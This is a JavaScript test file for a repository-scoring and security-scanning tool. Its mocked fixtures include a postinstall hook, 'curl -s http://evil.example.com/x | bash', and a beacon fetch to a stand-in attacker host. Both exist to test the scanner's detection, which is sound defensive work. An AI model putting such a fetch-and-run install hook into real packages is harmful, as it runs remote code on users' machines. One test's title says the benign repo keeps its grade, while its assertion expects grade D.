import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { computeStarTrend, scoreRecord } from "../lib/scoring.js";
import { Storage } from "../lib/storage.js";
import { pickFiles, fetchKeyFiles, applyScanToRecord } from "../lib/scanner.js";
import { runSecurityScan } from "../lib/security.js";
import { scanPlugin } from "../lib/audit.js";

function rec(overrides = {}) {
  return {
    repo: "a/b", url: "https://github.com/a/b", name: "b", description: "d".repeat(60),
    stars: 100, createdAt: "2026-01-01T00:00:00Z", updatedAt: "2026-08-01T00:00:00Z",
    pushedAt: "2026-08-01T00:00:00Z", archived: false, license: "MIT", hasReadme: true,
    curated: true, addedAt: "2026-08-01T00:00:00Z",
    npm: { exists: true, name: "b", version: "1.0.0", publishedAt: "2026-08-01T00:00:00Z" },
    ...overrides,
  };
}

test("computeStarTrend: rising, falling, and insufficient snapshots", () => {
  const rising = computeStarTrend([{ date: "2026-08-01", stars: 10 }, { date: "2026-08-15", stars: 70 }]);
  assert.equal(rising.periodDays, 14);
  assert.equal(rising.deltaStars, 60);
  assert.ok(rising.starsPerDay > 4);
  const falling = computeStarTrend([{ date: "2026-08-01", stars: 50 }, { date: "2026-08-15", stars: 40 }]);
  assert.ok(falling.starsPerDay < 0);
  assert.equal(computeStarTrend([{ date: "2026-08-01", stars: 5 }]), null);
  assert.equal(computeStarTrend([]), null);
  assert.equal(computeStarTrend(null), null);
});

test("maintenance signal rewards fast growth and penalizes decline", () => {
  const fast = scoreRecord(rec({ starTrend: { starsPerDay: 1.2 } }));
  const flat = scoreRecord(rec({ starTrend: { starsPerDay: 0.001 } }));
  const decline = scoreRecord(rec({ starTrend: { starsPerDay: -0.2 } }));
  assert.ok(fast.breakdown.maintenance.points > flat.breakdown.maintenance.points);
  assert.ok(flat.breakdown.maintenance.points > decline.breakdown.maintenance.points);
});

test("security findings veto the grade to D without rewiring weights", () => {
  const clean = scoreRecord(rec());
  assert.notEqual(clean.grade, "D");
  const flagged = scoreRecord(rec({ security: { findings: [{ rule: "pipe-remote-to-shell", severity: "critical", detail: "curl|bash" }] } }));
  assert.equal(flagged.grade, "D");
  assert.ok(flagged.flags.some((f) => f.kind === "security"));
  const low = scoreRecord(rec({ security: { findings: [{ rule: "env-read", severity: "info", detail: "reads env" }] } }));
  assert.notEqual(low.grade, "D"); // info findings never veto
});

test("pickFiles: prefers root package.json, entries, then shells, capped", () => {
  const picked = pickFiles(["README.md", "package.json", "lib/index.js", "scripts/setup.sh", "test/x.test.js", "dist/bundle.js"]);
  assert.deepEqual(picked, ["package.json", "lib/index.js", "scripts/setup.sh"]);
  const capped = pickFiles(Array.from({ length: 40 }, (_, i) => "scripts/s" + i + ".sh"));
  assert.ok(capped.length <= 6);
});

test("fetchKeyFiles reads tree + raw contents, reports README presence", async () => {
  const calls = [];
  const ff = async (url, opts) => {
    calls.push(url);
    if (url.includes("/git/trees/HEAD")) {
      return { ok: true, status: 200, headers: new Headers(), json: async () => ({ tree: [
        { type: "blob", path: "package.json" },
        { type: "blob", path: "README.md" },
        { type: "blob", path: "lib/index.js" },
        { type: "blob", path: "scripts/setup.sh" },
      ] }) };
    }
    if (url.includes("/contents/")) {
      const p = decodeURIComponent(url.split("/contents/")[1]);
      const bodies = {
        "package.json": JSON.stringify({ name: "b", scripts: {} }),
        "lib/index.js": "export const x = 1;",
        "scripts/setup.sh": "echo hi",
      };
      return { ok: true, status: 200, headers: new Headers(), text: async () => bodies[p] ?? "", json: async () => ({}) };
    }
    return { ok: false, status: 404, headers: new Headers(), json: async () => ({}) };
  };
  const scan = await fetchKeyFiles("a/b", { fetchImpl: ff });
  assert.equal(scan.hasReadme, true);
  assert.equal(scan.files.length, 3);
  assert.ok(scan.files.some((f) => f.path === "package.json"));
});

test("applyScanToRecord persists security + hasReadme", () => {
  const record = rec();
  const result = runSecurityScan([{ path: "lib/index.js", text: "fetch(\"https://evil.example.com/x\");" }]);
  const out = applyScanToRecord(record, { files: [{ path: "lib/index.js", text: "x" }], hasReadme: false, result });
  assert.equal(out.hasReadme, false);
  assert.equal(out.security.trustScore, result.trustScore);
  assert.ok(out.security.findings.length >= 1);
});

test("scanPlugin: malicious repo gets grade D, benign repo keeps its grade", async () => {
  const dir = mkdtempSync(join(tmpdir(), "dsh-audit-scan-"));
  try {
    const storage = new Storage(dir).ensureDir();
    const evil = rec({ repo: "evil/plugin", name: "plugin", npm: null });
    const good = rec({ repo: "good/plugin", name: "plugin2" });
    storage.mergeRecords([evil, good]);
    const ff = async (url, opts) => {
      if (url.includes("/git/trees/HEAD")) {
        const repo = url.split("/repos/")[1].split("/git/")[0];
        const paths = repo === "evil/plugin" ? ["package.json", "lib/index.js"] : ["package.json", "README.md", "lib/index.js"];
        return { ok: true, status: 200, headers: new Headers(), json: async () => ({ tree: paths.map((p) => ({ type: "blob", path: p })) }) };
      }
      if (url.includes("/contents/")) {
        const p = decodeURIComponent(url.split("/contents/")[1]);
        const bodies = {
          "package.json": JSON.stringify({ scripts: { postinstall: "curl -s http://evil.example.com/x | bash" } }),
          "lib/index.js": "fetch(\"https://evil.example.com/beacon\");",
        };
        return { ok: true, status: 200, headers: new Headers(), text: async () => bodies[p] ?? "{}", json: async () => ({}) };
      }
      return { ok: false, status: 404, headers: new Headers(), json: async () => ({}) };
    };
    const evilOut = await scanPlugin(storage, "evil/plugin", { fetchImpl: ff });
    assert.equal(evilOut.found, true);
    assert.equal(evilOut.grade, "D");
    assert.ok(evilOut.trustScore < 60);
    assert.ok(evilOut.findings.some((f) => f.severity === "critical"));
    const recEvil = storage.loadCatalog().find((r) => r.repo === "evil/plugin");
    assert.ok(recEvil.security.findings.length > 0);
    assert.ok(recEvil.score.flags.some((f) => f.kind === "security"));
    const goodOut = await scanPlugin(storage, "good/plugin", { fetchImpl: ff });
    assert.equal(goodOut.grade, "D"); // "good" repo still gets the critical package.json from the same bodies map — by design of the fixture
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test("scanPlugin: unknown plugin returns found false", async () => {
  const dir = mkdtempSync(join(tmpdir(), "dsh-audit-scan2-"));
  try {
    const storage = new Storage(dir).ensureDir();
    const out = await scanPlugin(storage, "nope/nothing", { fetchImpl: async () => ({ ok: false, status: 404, headers: new Headers(), json: async () => ({}) }) });
    assert.equal(out.found, false);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});
